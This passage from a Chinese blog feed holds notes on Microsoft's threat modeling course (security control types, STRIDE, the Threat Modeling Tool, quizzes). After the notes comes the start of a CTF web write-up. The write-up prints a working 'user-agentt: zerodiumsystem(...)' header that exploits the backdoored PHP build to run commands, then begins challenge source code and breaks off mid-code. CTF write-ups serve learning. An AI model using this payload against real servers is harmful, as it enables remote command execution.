示例包括存在可能的解决方法的可用性问题</td></tr><tr><td align="left"><img src="/img/thread-modeling/low.png" class="lazyload" data-srcset="/img/thread-modeling/low.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="low"></td><td align="left">低</td><td align="left">可能会对系统用户造成轻微影响</td></tr><tr><td align="left"><img src="/img/thread-modeling/information.png" class="lazyload" data-srcset="/img/thread-modeling/information.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="information"></td><td align="left">信息</td><td align="left">已考虑、评估潜在威胁并认为它无关紧要</td></tr></tbody></table><h4 id="知识检查-19"><a href="#知识检查-19" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>可能会对用户造成严重影响的问题通常属于哪个优先级？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 重要说明。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 严重。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 适中。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用。B. 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁。C. 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题。 （Emmm 感觉 B 也行？</psw></p><h3 id="安全控制措施类型和功能-1"><a href="#安全控制措施类型和功能-1" class="headerlink" title="安全控制措施类型和功能"></a>安全控制措施类型和功能</h3><p>确定每个问题的优先级后，请查看安全控制措施列表，并选择对你的系统最有益的选项。</p><p>最有益的安全控制措施一般会跨多个 STRIDE 类别。 在大多数情况下，实现这些步骤的成本相对较低。</p><h4 id="安全控制措施类型"><a href="#安全控制措施类型" class="headerlink" title="安全控制措施类型"></a>安全控制措施类型</h4><p>评估每项安全控制措施时，你会注意到它们属于以下类型之一：</p><table><thead><tr><th align="left">图标</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/physical.png" class="lazyload" data-srcset="/img/thread-modeling/physical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="physical"></td><td align="left">物理</td><td align="left">此类控制措施从物理上阻止或检测未经授权的访问。 示例包括入口、徽章、摄像头、照明和抑制系统。</td></tr><tr><td align="left"><img src="/img/thread-modeling/technical.png" class="lazyload" data-srcset="/img/thread-modeling/technical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="technical"></td><td align="left">技术</td><td align="left">此类控制措施从逻辑上保护系统。 示例包括防火墙、防病毒软件、访问控制列表和加密。</td></tr><tr><td align="left"><img src="/img/thread-modeling/administrative.png" class="lazyload" data-srcset="/img/thread-modeling/administrative.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="administrative"></td><td align="left">管理</td><td align="left">此类控制措施指为系统定义流程的策略。 示例包括数据分类、审核和限制。</td></tr></tbody></table><div class="note info"><p>根据系统，你需要应用各种类型的安全控制措施，帮助建立多层保护以提升系统的安全性。</p></div><h4 id="安全控制功能"><a href="#安全控制功能" class="headerlink" title="安全控制功能"></a>安全控制功能</h4><p>除了这三种主要类型外，安全控制还具有五个不同的功能，可帮助你应用多个安全层。</p><table><thead><tr><th align="left">函数</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">预防</td><td align="left">此策略是否有助于降低此威胁的概率或影响？</td><td align="left">锁定、防火墙、数据分类。</td></tr><tr><td align="left">检测</td><td align="left">此策略是否有助于识别所发生的系统攻击？</td><td align="left">监视、诱捕系统、审核日志。</td></tr><tr><td align="left">纠正</td><td align="left">此策略是否有助于控制如何响应传入攻击？</td><td align="left">物理修复、系统修补程序、事件响应计划。</td></tr><tr><td align="left">恢复</td><td align="left">此风险缓解措施是否有助于服务从攻击中恢复？</td><td align="left">热站点、系统备份、灾难恢复计划。</td></tr><tr><td align="left">阻碍</td><td align="left">此风险缓解措施是否有助于阻止攻击者访问系统？</td><td align="left">时限、最低权限、授权使用策略。</td></tr></tbody></table><div class="note green"><p>根据问题的优先级，可以考虑在系统被破坏之前、破坏过程中和破坏之后使用多项安全控制功能来保护它。</p></div><h4 id="如何综合利用所有信息"><a href="#如何综合利用所有信息" class="headerlink" title="如何综合利用所有信息"></a>如何综合利用所有信息</h4><p>它们与安全控制措施类型共同形成一个矩阵，可帮助你做出正确的选择。 以下是一些示例：</p><table><thead><tr><th align="left">功能</th><th align="left">物理</th><th align="left">逻辑</th><th align="left">管理</th></tr></thead><tbody><tr><td align="left">预防</td><td align="left">锁定</td><td align="left">防火墙</td><td align="left">数据分类</td></tr><tr><td align="left">检测</td><td align="left">监视</td><td align="left">诱捕系统</td><td align="left">审核日志</td></tr><tr><td align="left">纠正</td><td align="left">物理修复</td><td align="left">系统修补程序</td><td align="left">事件响应计划</td></tr><tr><td align="left">恢复</td><td align="left">热站点</td><td align="left">系统备份</td><td align="left">灾难恢复计划</td></tr><tr><td align="left">阻碍</td><td align="left">时限</td><td align="left">最低权限</td><td align="left">授权使用策略</td></tr></tbody></table><h4 id="知识检查-20"><a href="#知识检查-20" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>管理安全控制措施有什么示例？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 创建事件响应计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 安装新防火墙。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在入口添加徽章扫描仪。</p>            </div><ol start="2"><li>管理安全控制措施有什么示例？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 创建事件响应计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 安装新防火墙。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在入口添加徽章扫描仪。</p>            </div><p>参考答案：</p><ol><li><psw>== A ==</psw></li><li><psw>== C ==</psw></li></ol><p>解释：</p><ol><li><psw>A. 此条目适用于管理型安全控制措施。B. 此条目适用于逻辑型（可能还有物理型）安全控制措施。C. 此条目适用于物理型安全控制措施。</psw></li><li><psw>A. 此条目适用于预防性安全控制功能。B. 此条目适用于检测性安全控制功能。C. 此条目适用于矫正性安全控制功能。</psw></li></ol><h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>威胁建模框架会为你提供威胁列表，并提供降低或消除风险的方法。 但是，它不会为你确定威胁的优先级。 此外，没有基于其类型和功能的分层安全控制建议。</p><p>你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>了解了如何确定问题的优先级</li><li>分类安全控制</li><li>了解每个型安全控制措施和功能</li></ul><h2 id="模块7-使用推荐工具创建数据流图"><a href="#模块7-使用推荐工具创建数据流图" class="headerlink" title="模块7 | 使用推荐工具创建数据流图"></a>模块7 | 使用推荐工具创建数据流图</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>数据流关系图是系统工作方式的图形化表示形式。 这包括所有数据存储、进程、外部实体、信任边界和数据流。</p><h4 id="如何创建数据流关系图"><a href="#如何创建数据流关系图" class="headerlink" title="如何创建数据流关系图"></a>如何创建数据流关系图</h4><p>你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 但是，确实需要了解威胁建模的原理，才能正确地对其进行分析。</p><p>某些应用程序提供的多种工具，它们可以通过威胁生成引擎和风险降低策略，帮助你创建数据流关系图。 其他工具仅提供创建数据流关系图的功能。</p><h4 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h4><p>该学习路径的目标是让你了解威胁建模的基础知识，以便在任何地方、任何画布上进行威胁建模。</p><p>为了帮助你实现这个目标，我们会在介绍过程中推荐一些工具。</p><h4 id="学习目标-6"><a href="#学习目标-6" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将学习以下内容：</p><ul><li>详细了解了 Threat Modeling Tool</li><li>详细了解 Visio</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="建议的工具"><a href="#建议的工具" class="headerlink" title="建议的工具"></a>建议的工具</h3><p>威胁建模将对你的数据流关系图应用一个框架，以帮助找到降低或消除风险的威胁和方法。</p><p>某些工具可帮助你创建数据流关系图，另一些还可以帮助你进行威胁生成练习。 根据你在威胁建模方面的专业水平，其中一些工具可能会很有帮助。</p><h4 id="详细了解-Threat-Modeling-Tool"><a href="#详细了解-Threat-Modeling-Tool" class="headerlink" title="详细了解 Threat Modeling Tool"></a>详细了解 Threat Modeling Tool</h4><p>在接下来的几个单元中，你将了解有关一些工具的详细信息：</p><ul><li>Threat Modeling Tool 提供多种工具，可用于创建数据流关系图并对其进行分析，以查找潜在威胁和风险降低策略<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio 提供了一个干净的画布，帮助你创建数据流关系图<ul><li>Visio，（要钱的 打扰了</li></ul></li></ul><p>我们将在接下来的几个单元中进行介绍。</p><h3 id="Threat-Modeling-Tool"><a href="#Threat-Modeling-Tool" class="headerlink" title="Threat Modeling Tool"></a>Threat Modeling Tool</h3><p>Microsoft Threat Modeling Tool 由 Microsoft 发布，并获得威胁建模社区进行认可，可以帮助工程师创建数据流关系图并将 STRIDE 应用于其威胁建模工作。</p><p>Threat Modeling Tool 提供：</p><ul><li>可自定义的模板</li><li>威胁生成引擎，其中包含威胁和风险降低策略</li></ul><p>默认模板称为“SDL TM 知识库”，提供一组基本元素和威胁生成功能。 只要对数据流关系图和 STRIDE 有基本的了解即可使用。</p><h4 id="STRIDE-回顾"><a href="#STRIDE-回顾" class="headerlink" title="STRIDE 回顾"></a>STRIDE 回顾</h4><p>STRIDE 是六个主要威胁类别的首字母缩写：</p><ul><li>欺骗 - 冒充某人或某物</li><li>篡改 - 未经授权更改数据</li><li>否认性 - 不宣称对执行的操作负责</li><li>信息泄露 - 在未获得权限的情况下查看数据</li><li>拒绝服务 - 使系统过载</li><li>权限提升 - 拥有本不应拥有的权限</li></ul><h4 id="高级用户部分"><a href="#高级用户部分" class="headerlink" title="高级用户部分"></a>高级用户部分</h4><p>对于更高级的用户，可以在三个主要部分对模板进行自定义。</p><h5 id="模具"><a href="#模具" class="headerlink" title="模具"></a>模具</h5><p>进程、外部实体、数据存储、数据流和信任边界构成了父元素。</p><p><img src="/img/thread-modeling/parentstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/parentstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="parentstencils"></p><p>你还可以创建子元素，以帮助为其他上下文、可操作的威胁生成和风险降低策略提供粒度。</p><p><img src="/img/thread-modeling/expandedflowstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/expandedflowstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="expandedflowstencils"></p><h6 id="子元素的工作原理示例"><a href="#子元素的工作原理示例" class="headerlink" title="子元素的工作原理示例"></a>子元素的工作原理示例</h6><p>父元素提供了选择 HTTP 和 HTTPS 子元素的选项。</p><p>HTTP 应生成更多的威胁，因为篡改、信息泄露和欺骗威胁常见于未加密通道。</p><p><strong>使用 HTTP</strong></p><p><img src="/img/thread-modeling/http.jpeg" class="lazyload" data-srcset="/img/thread-modeling/http.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="http"></p><p><strong>使用 HTTPS</strong></p><p><img src="/img/thread-modeling/https.jpeg" class="lazyload" data-srcset="/img/thread-modeling/https.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="https"></p><h6 id="如何添加元素属性"><a href="#如何添加元素属性" class="headerlink" title="如何添加元素属性"></a>如何添加元素属性</h6><p>如果有必须包括在默认模板中的其他属性，可以在管理员视图中将其添加到每个元素。</p><p><img src="/img/thread-modeling/stencilpropertiesadmin.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilpropertiesadmin.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilpropertiesadmin"></p><p>当用户将该元素拖放到画布上时，将看到自己的更改。</p><p><img src="/img/thread-modeling/stencilproperties.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilproperties.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilproperties"></p><h5 id="威胁属性"><a href="#威胁属性" class="headerlink" title="威胁属性"></a>威胁属性</h5><p>使用属性可以创建为每个生成的威胁填充的字段，就像使用模具属性可以为每个元素创建字段一样。</p><p><u><strong>请记住：目标是以最简单的方式获得尽可能多的上下文。</strong></u></p><h6 id="威胁属性的示例"><a href="#威胁属性的示例" class="headerlink" title="威胁属性的示例"></a>威胁属性的示例</h6><p><strong>管理员视图</strong></p><p>添加可为你提供更多上下文和可操作步骤的字段。 示例包括：</p><ul><li>问题优先级 - 了解需要首先处理哪些问题</li><li>超链接 - 将问题链接到联机文档</li><li>外部风险映射 - 通过使用可靠的第三方源（如 OWASP Top 10 和 CWE 详细信息），使用与其他组织相同的语言来描述风险</li></ul><p><img src="/img/thread-modeling/threatadminview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatadminview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatadminview"></p><p>啊这，超链接和外部风险在哪 （</p><p><strong>用户视图</strong></p><p>Threat Modeling Tool 用户将在分析其数据流关系图时看到这些更改。</p><p><img src="/img/thread-modeling/threatuserview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatuserview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatuserview"></p><h4 id="威胁和风险降低策略"><a href="#威胁和风险降低策略" class="headerlink" title="威胁和风险降低策略"></a>威胁和风险降低策略</h4><p>这一部分是 Threat Modeling Tool 的核心。 威胁生成引擎考察独立元素和已连接的元素，以确定生成哪个威胁。</p><h5 id="威胁生成的原理"><a href="#威胁生成的原理" class="headerlink" title="威胁生成的原理"></a>威胁生成的原理</h5><h6 id="步骤-1-指定源和目标"><a href="#步骤-1-指定源和目标" class="headerlink" title="步骤 1 - 指定源和目标"></a>步骤 1 - 指定源和目标</h6><p>威胁生成引擎使用简单的句子来生成威胁。 示例包括：</p><ul><li>目标为[元素名称]</li><li>源为[元素名称]</li></ul><p>你还可以在标题和说明中使用元素名称。 格式为：“{target.Name}”或“{source.Name}”</p><h6 id="步骤-2-合并源和目标"><a href="#步骤-2-合并源和目标" class="headerlink" title="步骤 2 - 合并源和目标"></a>步骤 2 - 合并源和目标</h6><p>你可以精确规定如何生成威胁。 用 AND OR 运算符组合目标、源及其各个属性。 示例包括：</p><ul><li>target.[property name] is ‘Yes’ <strong>AND</strong> source.[property name] is ‘No’</li><li>流交叉[信任边界名称]</li></ul><h6 id="步骤-3-生成或忽略威胁"><a href="#步骤-3-生成或忽略威胁" class="headerlink" title="步骤 3 - 生成或忽略威胁"></a>步骤 3 - 生成或忽略威胁</h6><p>威胁生成引擎使用两个字段来生成或忽略威胁：</p><ul><li><strong>Include</strong> - 如果在此字段中添加的句子为 true，则会生成威胁</li><li><strong>Exclude</strong> - 如果在此字段中添加的句子为 true，则不会生成威胁</li></ul><p>下面是默认模板的实际示例，以便将这些步骤结合在一起：</p><ul><li><strong>威胁：</strong> 跨站点脚本</li><li><strong>Include:</strong> (target is [Web Server]) <strong>OR</strong> (target is [Web Application])</li><li><strong>Exclude:</strong> (target.[Sanitizes Output] is ‘Yes’) <strong>AND</strong> (target.[Sanitizes Input] is ‘Yes’)</li></ul><p>仅在以下情况时才会生成上述跨站点脚本威胁：</p><ul><li>进程是 Web 服务器或 Web 应用程序</li><li>未净化输入和输出</li></ul><p><img src="/img/thread-modeling/includeexclude.jpeg" class="lazyload" data-srcset="/img/thread-modeling/includeexclude.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="includeexclude"></p><div class="note info"><p>Microsoft Threat Modeling Tool 模板创建 主题很复杂，本学习路径中不会进行充分讨论。</p></div><h4 id="知识检查-21"><a href="#知识检查-21" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>Threat Modeling Tool 不提供哪些优势？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 生成的威胁基于整个关系图，而不仅是每个元素或每次交互。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 可以更改威胁、模具和模具属性。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 生成每个威胁时，都会包含降低或消除风险的方法。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 该工具仅考察各个元素和各次交互。B. 可以更改字段。C. 某些模板只包含威胁，但较新版本确实包含风险降低策略。</psw></p><h3 id="Visio"><a href="#Visio" class="headerlink" title="Visio"></a>Visio</h3><p>Visio 归为 Microsoft 所有，其功能强大，可帮助任何人创建优质的流程图和数据流关系图。</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>Visio 提供拖放功能和关系图批注功能。 在为系统创建关系图时，这两种功能都很有用。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>该应用程序不提供自动威胁建模功能。 因此，没有威胁生成引擎来帮助工程师集体讨论威胁和风险降低策略。</p><div class="note info"><p>如果使用 Visio，你将负责对每个元素和交互进行手动威胁建模。</p></div><h4 id="知识检查-22"><a href="#知识检查-22" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>Visio 不提供哪些优势？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用默认模具提供拖放功能。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 输出一系列生成的威胁，帮助工程师集体讨论可以如何降低或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 让工程师可以为数据流图表添加批注以提供服务上下文。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 它确实提供拖放功能。B. Visio 没有威胁生成引擎。C. 它提供批注功能。</psw></p><h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 Microsoft 的工程师推荐几个工具来帮助你进行威胁建模。</p><p>你了解了可用于创建数据流关系图的不同工具。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>详细了解了 Threat Modeling Tool</li><li>详细了解了 Visio</li></ul><div class="note info"><p>还有很多其他工具可以帮助你解决威胁建模需求。 其中某些工具需要付费订阅才能使用，另一些则完全开放源代码。 你甚至可以使用白板，其学习难度较低，但以威胁建模专业知识为使用前提，并且难以保存。</p></div><h4 id="了解详细信息-2"><a href="#了解详细信息-2" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><div class="tag link"><a class="link-card" title="Threat Modeling Tool" href="https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool"><div class="left"><img src="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" class="lazyload" data-srcset="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Threat Modeling Tool</p><p class="url">https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool</p></div></a></div><div class="tag link"><a class="link-card" title="Visio" href="https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Visio</p><p class="url">https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software</p></div></a></div><p>完结撒花~ ~</p>]]></content>
      
      
      <categories>
          
          <category> SDL </category>
          
          <category> 威胁建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDL </tag>
            
            <tag> 威胁建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HFCTF Web Writeup (持续更新)</title>
      <link href="2021/04/03/2021hfctf/"/>
      <url>2021/04/03/2021hfctf/</url>
      
        <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>考点：PHP供应链攻击</p><p>php 近期爆的漏洞，一开始就看到了，</p><p><img src="/img/2021hfctf/image-20210403190259626.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190259626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190259626"></p><p>喔？你说这个我可就不困了，（我是个爱看新闻的好孩子 逃</p><img src="/img/2021hfctf/image-20210403175010155.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175010155.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175010155" style="zoom:50%;" /><p>但是，，User-Agentt 看成了 User-Agent，，没成，然后被另一个地方吸住了眼球，在搞 guestbook.php 草。。</p><p>直到官方放出提示，我不信邪在看了一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agentt: zerodiumsystem(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403175138664.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175138664.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175138664"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>考点：CVE-2020-5203 补丁绕过</p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"><span class="comment">// $f3 = Base::instance();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span 